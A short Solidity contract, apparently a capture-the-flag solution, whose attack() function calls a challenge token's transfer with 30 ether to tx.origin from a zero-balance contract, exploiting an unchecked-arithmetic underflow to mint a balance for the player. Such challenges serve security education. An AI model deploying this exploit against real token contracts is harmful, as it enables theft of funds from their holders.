// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool) ;

    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenHack {
    IToken public challenge;

    constructor(address challengeAddress) {
        challenge = IToken(challengeAddress);
    }

    function attack() public {
        challenge.transfer(tx.origin, 30 ether);
    }
}
